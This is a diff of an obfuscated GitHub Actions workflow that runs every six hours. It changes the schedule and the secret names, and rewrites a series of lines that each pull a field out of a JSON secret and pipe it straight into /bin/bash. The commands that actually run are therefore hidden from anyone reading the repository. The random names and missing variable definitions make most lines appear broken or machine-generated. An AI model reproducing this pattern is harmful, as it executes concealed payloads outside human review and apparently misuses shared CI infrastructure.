@@ -1,9 +1,9 @@
 name: pousuanshami
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
+    - cron: '14 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: pousuanshami
         env:
-          bk579: ${{ secrets.bk579 }}
+          iio7: ${{ secrets.iio7 }}
         run: |
-          echo $bk579 | jq -r .zfw7 | /bin/bash
-          echo $s640 | jq -r .s6369 | /bin/bash
-          echo $hky401 | jq -r .tvccv83934 | /bin/bash
-          echo $oxlt72 | jq -r .fuqo7 | /bin/bash
-          echo $bbizq270 | jq -r .q519 | /bin/bash
-          echo $lrhut2 | jq -r .phy1 | /bin/bash
-          echo $sk3492 | jq -r .rltc1459 | /bin/bash
-          echo $ns650 | jq -r .huf7 | /bin/bash
-          echo $wf7713 | jq -r .cvma80 | /bin/bash
-          echo $sz8 | jq -r .dncl545 | /bin/bash
-          echo $nexwp599 | jq -r .mlws635 | /bin/bash
-          echo $tgk88 | jq -r .nuil28874 | /bin/bash
-          echo $yjbrd3 | jq -r .wyoux2 | /bin/bash
-          echo $faaan0 | jq -r .mvh836 | /bin/bash
+          echo $iio7 | jq -r .ijmrw23 | /bin/bash
+          echo $szega297 | jq -r .mpv33218 | /bin/bash
+          echo $wig6882 | jq -r .p24 | /bin/bash
+          echo $qonqp667 | jq -r .wsr10 | /bin/bash
+          echo $occi06169 | jq -r .vu5629 | /bin/bash
+          echo $ofhf0 | jq -r .daak9 | /bin/bash
+          echo $innd4 | jq -r .cgd78217 | /bin/bash
+          echo $ymb08402 | jq -r .nkmve37341 | /bin/bash
+          echo $ny9549 | jq -r .qfu55352 | /bin/bash
+          echo $p706 | jq -r .e6038 | /bin/bash
+          echo $r2 | jq -r .mfo33 | /bin/bash
 
